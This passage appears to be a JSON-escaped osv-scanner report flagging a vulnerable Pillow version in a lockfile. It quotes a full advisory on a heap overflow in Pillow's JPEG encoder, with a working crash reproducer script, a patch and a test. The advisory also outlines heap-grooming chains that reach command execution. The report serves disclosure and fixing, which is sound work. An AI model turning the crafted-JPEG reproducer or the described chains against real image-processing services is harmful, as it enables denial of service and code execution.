`JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.\n\u003e \n\u003e The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.\n\u003e \n\u003e Each file goes through the same application code in a child `python3 -X faulthandler` process:\n\u003e \n\u003e ```python\n\u003e im = Image.open(BytesIO(data))\n\u003e im.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e ```\n\u003e \n\u003e 1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless.\n\u003e 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info[\"comment\"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.\n\u003e \n\u003e Expected output: the control prints `save returned normally` and `-\u003e exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-\u003e exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/JpegEncode.c\n\u003e +++ b/src/libImaging/JpegEncode.c\n\u003e @@ -327,6 +327,11 @@\n\u003e          case 4:\n\u003e  \n\u003e              if (context-\u003ecomment) {\n\u003e +                // check for comment len + 'COM' header bytes\n\u003e +                if (context-\u003ecomment_size + 5 \u003e\n\u003e +                    context-\u003edestination.pub.free_in_buffer) {\n\u003e +                    break;\n\u003e +                }\n\u003e                  jpeg_write_marker(\n\u003e ```\n\u003e \n\u003e The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b\"\"`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.\n\u003e \n\u003e The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError(\"Comment is too long\")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.\n\u003e \n\u003e Independently, the \"+ 1 spare byte\" / \"+ 5\" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Check free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save\n\u003e \n\u003e Applies to `src/libImaging/JpegEncode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py\n\u003e index b361aef2e..f884883c4 100644\n\u003e --- a/Tests/test_file_jpeg.py\n\u003e +++ b/Tests/test_file_jpeg.py\n\u003e @@ -227,6 +227,16 @@ class TestFileJpeg:\n\u003e          im1 = self.roundtrip(hopper(), icc_profile=icc_profile)\n\u003e          assert im1.info.get(\"icc_profile\") == (icc_profile or None)\n\u003e  \n\u003e +    def test_icc_big_comment(self) -\u003e None:\n\u003e +        # The ICC profile may fill the encoder buffer exactly, in which case the\n\u003e +        # comment has to be written to the next buffer\n\u003e +        comment = b\"C\" * 65533\n\u003e +        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30):\n\u003e +            icc_profile = b\"I\" * n\n\u003e +            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment)\n\u003e +            assert im.info[\"icc_profile\"] == icc_profile\n\u003e +            assert im.info[\"comment\"] == comment\n\u003e +\n\u003e      def test_large_icc_meta(self, tmp_path: Path) -\u003e None:\n\u003e          # https://github.com/python-pillow/Pillow/issues/148\n\u003e          # Sometimes the meta data on the icc_profile block is bigger than\n\u003e diff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py\n\u003e index 4b8d34ca3..1d9f4c2fa 100644\n\u003e --- a/src/PIL/JpegImagePlugin.py\n\u003e +++ b/src/PIL/JpegImagePlugin.py\n\u003e @@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n\u003e              )\n\u003e              i += 1\n\u003e  \n\u003e -    comment = info.get(\"comment\", im.info.get(\"comment\"))\n\u003e +    comment = info.get(\"comment\", im.info.get(\"comment\")) or b\"\"\n\u003e +    if isinstance(comment, str):\n\u003e +        comment = comment.encode()\n\u003e  \n\u003e      # \"progressive\" is the official name, but older documentation\n\u003e      # says \"progression\"\n\u003e @@ -856,10 +858,13 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -\u003e None:\n\u003e              bufsize += len(exif) + 5\n\u003e          if extra:\n\u003e              bufsize += len(extra) + 1\n\u003e +        if comment:\n\u003e +            bufsize += len(comment) + 5\n\u003e      else:\n\u003e          # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n\u003e -        # Ensure that our buffer is big enough. Same with the icc_profile block.\n\u003e -        bufsize = max(len(exif) + 5, len(extra) + 1)\n\u003e +        # Ensure that our buffer is big enough. Same with the icc_profile block\n\u003e +        # and the comment (COM marker).\n\u003e +        bufsize = max(len(exif) + 5, len(extra) + 1, len(comment) + 5)\n\u003e  \n\u003e      ImageFile._save(\n\u003e          im, fp, [ImageFile._Tile(\"jpeg\", (0, 0, *im.size), 0, rawmode)], bufsize\n\u003e diff --git a/src/libImaging/JpegEncode.c b/src/libImaging/JpegEncode.c\n\u003e index 098e431fc..b6771c6ec 100644\n\u003e --- a/src/libImaging/JpegEncode.c\n\u003e +++ b/src/libImaging/JpegEncode.c\n\u003e @@ -327,6 +327,11 @@ ImagingJpegEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {\n\u003e          case 4:\n\u003e  \n\u003e              if (context-\u003ecomment) {\n\u003e +                // check for comment len + 'COM' header bytes\n\u003e +                if (context-\u003ecomment_size + 5 \u003e\n\u003e +                    context-\u003edestination.pub.free_in_buffer) {\n\u003e +                    break;\n\u003e +                }\n\u003e                  jpeg_write_marker(\n\u003e                      \u0026context-\u003ecinfo,\n\u003e                      JPEG_COM,\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,343 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow heap buffer overflow in ImagingJpegEncode() (src/libImaging/JpegEncode.c, case 4).\n\u003e #\n\u003e # Re-saving a JPEG with its own ICC profile, the usual \"keep the colours\" re-encode:\n\u003e #     im = Image.open(f); im.save(out, \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e # If the ICC segment fills the 65536-byte encoder buffer to the last byte, the COM\n\u003e # marker (forwarded from im.info[\"comment\"] automatically) is written with\n\u003e # free_in_buffer == 0. libjpeg stores the byte, then decrements the counter, which\n\u003e # wraps to ~2^64, and the comment plus the whole compressed image go past the end\n\u003e # of the heap buffer. The Python process dies with SIGSEGV or a glibc abort.\n\u003e #\n\u003e # Runs against the stock build in /src, no rebuild. Takes about 2 seconds.\n\u003e import random\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e from io import BytesIO\n\u003e \n\u003e from PIL import Image\n\u003e \n\u003e # Output-buffer layout at the moment the COM marker is written:\n\u003e ENCODER_BUFFER = 65536  # ImageFile.MAXBLOCK; _save() never makes it bigger here\n\u003e JFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress()\n\u003e ICC_OVERHEAD = 18  # FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" \u003cseq\u003e \u003ccount\u003e\n\u003e ICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit\n\u003e COMMENT = b\"C\" * 65533  # largest legal COM; content and length chosen by the file\n\u003e \n\u003e # What the victim application does with an uploaded file, run in a child process\n\u003e # so that we can see it die.\n\u003e RESAVE = \"\"\"\n\u003e import sys\n\u003e from io import BytesIO\n\u003e from PIL import Image\n\u003e im = Image.open(BytesIO(sys.stdin.buffer.read()))\n\u003e im.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e print(\"save returned normally\")\n\u003e \"\"\"\n\u003e \n\u003e \n\u003e def segment(marker, payload):\n\u003e     return bytes([0xFF, marker]) + struct.pack(\"\u003eH\", len(payload) + 2) + payload\n\u003e \n\u003e \n\u003e def make_jpeg(with_comment):\n\u003e     \"\"\"A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM.\"\"\"\n\u003e     noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data\n\u003e     out = BytesIO()\n\u003e     Image.frombytes(\"RGB\", (256, 256), noise).save(out, \"JPEG\", quality=95)\n\u003e     plain = out.getvalue()\n\u003e \n\u003e     icc = segment(0xE2, b\"ICC_PROFILE\\0\\x01\\x01\" + b\"I\" * ICC_PAYLOAD)\n\u003e     com = segment(0xFE, COMMENT) if with_comment else b\"\"\n\u003e     return plain[:2] + icc + com + plain[2:]  # splice in right after SOI\n\u003e \n\u003e \n\u003e def resave(jpeg):\n\u003e     # -X faulthandler: on a fatal signal, print where in Python the child died\n\u003e     cmd = [sys.executable, \"-X\", \"faulthandler\", \"-c\", RESAVE]\n\u003e     r = subprocess.run(cmd, input=jpeg, capture_output=True)\n\u003e     print((r.stdout + r.stderr).decode(errors=\"replace\").strip())\n\u003e     print(f\"-\u003e exit status {r.returncode}\")\n\u003e     return r.returncode\n\u003e \n\u003e \n\u003e # Control: the same file without a COM segment re-saves fine, so the buffer\n\u003e # sizing and the ICC profile on their own are harmless.\n\u003e print(\"Control: re-save the JPEG without a comment\")\n\u003e resave(make_jpeg(with_comment=False))\n\u003e \n\u003e # The bug: add a COM segment. The comment is now written into a buffer that has\n\u003e # no room left.\n\u003e print(f\"\\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment\")\n\u003e rc = resave(make_jpeg(with_comment=True))\n\u003e \n\u003e # A negative return code means the child was killed by a signal (SIGSEGV or\n\u003e # SIGABRT from glibc's heap checks), not by a Python exception.\n\u003e if rc \u003c 0:\n\u003e     print(f\"\\nim.save() killed the process with signal {-rc}: out-of-bounds heap write\")\n\u003e     print(\"BUG\")\n\u003e else:\n\u003e     print(\"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-g7cr-3p24-7wf7 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96778\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-96778](https://osv.dev/CVE-2026-96778)**.\n\n## [GHSA-g7cr-3p24-7wf7](https://osv.dev/GHSA-g7cr-3p24-7wf7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Heap buffer overflow writing JPEG comment after ICC profile fills buffer\n\u003e Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.\n\u003e \n\u003e The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.\n\u003e \n\u003e Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.\n\u003e \n\u003e The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.\n\u003e \n\u003e The unguarded call was introduced in e50ae85ea406 (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the \"extra\" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the \"buffer full\" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.\n\u003e \n\u003e A JPEG laid out as\n\u003e \n\u003e ```\n\u003e FFD8                                   SOI\n\u003e FFE2 \u003clen\u003e \"ICC_PROFILE\\0\" 01 01 \u003c65498 bytes\u003e     -\u003e im.info[\"icc_profile\"]\n\u003e FFFE \u003clen\u003e \u003ccomment, any length 1..65533\u003e           -\u003e im.info[\"comment\"]\n\u003e \u003cany baseline RGB JPEG body\u003e\n\u003e ```\n\u003e \n\u003e opened with `Image.open()` and re-saved with the usual colour-profile-preserving call\n\u003e \n\u003e ```python\n\u003e im.save(out, \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))\n\u003e ```\n\u003e \n\u003e kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:\n\u003e \n\u003e ```python\n\u003e # src/PIL/JpegImagePlugin.py:859-862\n\u003e     else:\n\u003e         # The EXIF info needs to be written as one block, + APP1, + one spare byte.\n\u003e         # Ensure that our buffer is big enough. Same with the icc_profile block.\n\u003e         bufsize = max(len(exif) + 5, len(extra) + 1)\n\u003e ```\n\u003e \n\u003e `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).\n\u003e \n\u003e The \"+1 spare byte\" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(\u0026cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:\n\u003e \n\u003e ```c\n\u003e // src/libImaging/JpegEncode.c:302-337\n\u003e         case 3:\n\u003e             if (context-\u003eextra) {\n\u003e                 unsigned int n = context-\u003eextra_size - context-\u003eextra_offset;\n\u003e                 if (n \u003e context-\u003edestination.pub.free_in_buffer) {\n\u003e                     n = context-\u003edestination.pub.free_in_buffer;\n\u003e                 }\n\u003e                 memcpy(context-\u003edestination.pub.next_output_byte, context-\u003eextra + context-\u003eextra_offset, n);\n\u003e                 context-\u003edestination.pub.next_output_byte += n;\n\u003e                 context-\u003edestination.pub.free_in_buffer -= n;\n\u003e                 context-\u003eextra_offset += n;\n\u003e                 if (context-\u003eextra_offset \u003e= context-\u003eextra_size) {\n\u003e                     state-\u003estate++;                 // done -\u003e fall into case 4, even with free_in_buffer == 0\n\u003e                 } else {\n\u003e                     break;\n\u003e                 }\n\u003e             } …\n\u003e \n\u003e         case 4:\n\u003e             if (context-\u003ecomment) {\n\u003e                 jpeg_write_marker(\u0026context-\u003ecinfo, JPEG_COM,\n\u003e                                   (unsigned char *)context-\u003ecomment, context-\u003ecomment_size);   // :330 — no space check\n\u003e             }\n\u003e             state-\u003estate++;\n\u003e \n\u003e         case 5:\n\u003e             if (1024 \u003e context-\u003edestination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64\n\u003e                 break;\n\u003e             }\n\u003e             … jpeg_write_scanlines(…) …\n\u003e ```\n\u003e \n\u003e Every other emitting state is guarded — state 2 requires `rawExifLen + 5 \u003c= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` (\"Use jpeg_write_marker to write comment\", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.\n\u003e \n\u003e With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is\n\u003e \n\u003e ```c\n\u003e /* jcmarker.c */\n\u003e   *(dest-\u003enext_output_byte)++ = (JOCTET)val;\n\u003e   if (--dest-\u003efree_in_buffer == 0) { if (!(*dest-\u003eempty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); }\n\u003e ```\n\u003e \n\u003e i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(\u0026buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.\n\u003e \n\u003e All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info[\"icc_profile\"]` (`:238-241`) and stores the COM payload in `im.info[\"comment\"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get(\"comment\", im.info.get(\"comment\"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info[\"icc_profile\"]` and a `tEXt` chunk keyed `comment` becomes `im.info[\"comment\"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert(\"RGB\") → save(\"JPEG\", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `\"Created with GIMP\"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.\n\u003e \n\u003e ### What lies behind the buffer\n\u003e \n\u003e The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo-\u003emain-\u003eprocess_data`) read from bytes the file supplied.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get(\"icc_profile\")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.\n\u003e \n\u003e It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context-\u003ecomment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.\n\u003e \n\u003e The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.\n\u003e \n\u003e Each file goes through the same application code in a child `python3 -X faulthandler` process:\n\u003e \n\u003e ```python\n\u003e im = Image.open(BytesIO(data))\n\u003e im.save(BytesIO(), \"JPEG\", icc_profile=im.info[\"icc_profile\"])\n\u003e ```\n\u003e \n\u003e 1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless.\n\u003e 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info[\"comment\"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.\n\u003e \n\u003e Expected output: the control prints `save returned normally` and `-\u003e exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-\u003e exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/JpegEncode.c\n\u003e +++ b/src/libImaging/JpegEncode.c\n\u003e @@ -327,6 +327,11 @@\n\u003e          case 4:\n\u003e  \n\u003e              if (context-\u003ecomment) {\n\u003e +                // check for comment len + 'COM' header 